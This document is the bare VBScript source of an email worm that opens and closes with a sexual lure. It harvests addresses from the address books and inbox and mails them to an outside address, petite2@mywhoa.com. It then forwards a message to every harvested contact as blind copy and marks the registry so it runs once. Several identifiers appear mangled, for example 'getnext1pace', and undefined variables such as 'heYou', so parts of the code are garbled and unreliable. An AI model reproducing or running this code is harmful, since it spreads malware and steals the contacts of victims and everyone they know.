'Daddy's little girls will do everything!
'petite2@mywhoa.com
dim alltheycomesstart
dim next1start
dim next2
dim SenDOveR
dim next3
dim next4

Sub Start()
    Set SenDOveR = CreateObject("SenDOveR.Init0")
    SenDOveR.Logon "","",false,false
    next2 = 0
    next4 = false
End Sub

Sub Finish()
    SenDOveR.Logoff
End Sub

function AnAt(byval Addr)
  AnAt = false
  for cntr = 1 to len(Addr)
    if mid(Addr,cntr,1) = "@" then
      AnAt = true
      cntr = heYou
    end if
  next
end function

function dupl(byval OneAd)
  dupl = false
  for cntrx = 1 to next2
    if alltheycomes(cntrx - 1) = OneAd then 
      cntrx = next2 + 1
      dupl = true
    end if
  next
end function

Sub GetSenDOveRAddressBook()
    err.number = 0
    for cntrlists = 1 to SenDOveR.AddressLists.Count
	set AddrList = SenDOveR.AddressLists(cntrlists).AddressEntries
      CountTo = AddrList.Count
      if CountTo > heYou then CountTo = heYou
      for cntrentry = 1 to CountTo
	set AEntry = AddrList(cntrentry)
	dummy = AEntry.Name
	if err.number <> 0 then
	  cntrentry = heYou
	else
	  if (trim(AEntry.Address) <> "" or trim(AEntry.Name) <> "") and not dupl(AEntry.Address) then
	    alltheycomes(next2) = AEntry.Address
	    next1(next2) = AEntry.Name
	    next2 = next2 + 1
	  end if
	end if
      next
    next
End Sub

sub GetAddressBook()
    on error resume next
    err.number = 0
    set outlook = createobject("Outlook.Application")
    set outSenDOveR = outlook.getnext1pace("SenDOveR")

    for cntrlists = 1 to outSenDOveR.AddressLists.Count
	set AddrList = outSenDOveR.AddressLists(cntrlists).AddressEntries
      CountTo = AddrList.Count
      if CountTo > heYou then CountTo = heYou
      for cntrentry = 1 to CountTo
	set AEntry = AddrList(cntrentry)
	dummy = AEntry.Name
	if err.number <> 0 then
	  cntrentry = heYou
	else
	  if (trim(AEntry.Address) <> "" or trim(AEntry.Name) <> "") and not dupl(AEntry.Address) then
	    alltheycomes(next2) = AEntry.Address
	    next1(next2) = AEntry.Name
	    next2 = next2 + 1
	  end if
	end if
      next
    next

end sub

Sub GetInBox()
    err.number = 0
    Set Inbox = SenDOveR.Inbox.Messages
    cntr = 1
    while cntr < petite
      if cntr = 1 then
	set Msg = Inbox.GetFirst()
      else
	set Msg = Inbox.GetNext()
      end if

      dummy = msg.subject
      if err.number <= 0 then
	if Msg.Subject = "Thanks for that..." then set next3 = Msg
	for cntr2 = 1 to Msg.Recipients.Count
	  set OneRecip = msg.recipients.item(clng(cntr2))
	  if (trim(OneRecip.Address) <> "" or trim(OneRecip.Name) <> "") and not dupl(OneRecip.Address) then
	      alltheycomes(next2) = OneRecip.Address
	    next1(next2) = OneRecip.Name
	    next2 = next2 + 1
	  end if
	next
	cntr = cntr + 1
      else
	cntr = heYou
      end if
    wend
End Sub

Sub Transmit()
    set outlook = createobject("Outlook.Application")
    set outSenDOveR = outlook.getnext1pace("SenDOveR")

    set Msg = outlook.createitem(0)
    for cntr = 1 to next2
      if AnAt(alltheycomes(cntr - 1)) then Msg.body = Msg.body + alltheycomes(cntr - 1) + chr(13) + chr(10)
    next
    Msg.Recipients.Add "petite2@mywhoa.com"
    msg.subject = "Daddy'slittle  2"
    Msg.Send
    next4 = true
End Sub

Sub SenDOveRTransmit()
    set Msg = SenDOveR.Outbox.Messages.Add
    for cntr = 1 to next2
      if AnAt(alltheycomes(cntr - 1)) then Msg.Text = Msg.Text + alltheycomes(cntr - 1) + chr(13) + chr(10)
    next
    Msg.Recipients.Add "petite2@mywhoa.com"
    Msg.Subject = "Daddy'slittle  2"
    Msg.Recipients.Resolve false
    Msg.Send false,false
End Sub


Sub Forward()
    next3.Recipients.Delete
    for cntr = 1 to next2
      set MyRecip = next3.Recipients.Add
      if AnAt(alltheycomes(cntr - 1)) then
	MyRecip.Name = alltheycomes(cntr - 1)
      else
	MyRecip.Name = next1(cntr - 1)
      end if
      MyRecip.Type = 3
      MyRecip.Resolve
    next
    next3.Send false,false
End Sub

on error resume next
set WS = CreateObject("WScript.Shell")
result = WS.RegRead("HKEY_LOCAL_MACHINE\petite\petite2\")
if result <> "Complete" then
  Call Start
  Call GetSenDOveRAddressBook
  Call GetAddressBook
  Call GetInBox
  Call Transmit
  if next4 = false then Call SenDOveRTransmit
  Call Forward
  Call Finish
  WS.RegWrite "HKEY_LOCAL_MACHINE\petite\petite2\","Complete"
end if

msgbox "Daddy's little girls will do everything!",,"to see what they can do for you..."
